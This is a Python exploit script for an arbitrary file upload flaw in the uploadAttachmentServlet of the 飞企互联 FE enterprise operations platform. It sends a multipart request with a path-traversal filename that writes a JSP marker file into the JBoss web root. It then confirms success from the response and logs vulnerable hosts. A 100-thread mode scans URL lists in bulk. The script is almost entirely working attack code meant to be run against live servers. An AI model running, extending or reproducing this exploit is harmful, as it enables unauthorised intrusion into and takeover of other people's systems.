#飞企互联-FE企业运营管理平台uploadAttachmentServlet 任意文件上传漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:FQHL_uploadAttachmentServlet_fileupload 1.0
                                                                Author: Laow🚦
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="飞企互联-FE企业运营管理平台uploadAttachmentServlet 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/servlet/uploadAttachmentServlet'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
        "Accept-Encoding": "gzip, deflate", 
        "Connection": "close", 
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk"
        }
    data = "------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"../../../../../jboss/web/fe.war/from.jsp\"\r\nContent-Type: text/plain\r\n\r\n<% out.println(\"123123\");%>\r\n------WebKitFormBoundaryKNt0t4vBe8cX9rZk\r\nContent-Disposition: form-data; name=\"json\"\r\n\r\n{\"iq\":{\"query\":{\"UpdateType\":\"mail\"}}}\r\n------WebKitFormBoundaryKNt0t4vBe8cX9rZk--\r\n\r\n"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        session = requests.session()
        response = session.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        payload2 = "/from.jsp;" #上传成功要访问的上传文件路径
        url2 = target + payload2
        # response2 = session.get(url=url2,proxies=proxies,timeout=5,verify=False)
        print(response.text)
        if response.status_code == 200 and "上传成功1 个文件." in response.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n[+]请访问:{url2} {RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass


        
if __name__ == '__main__':
    main()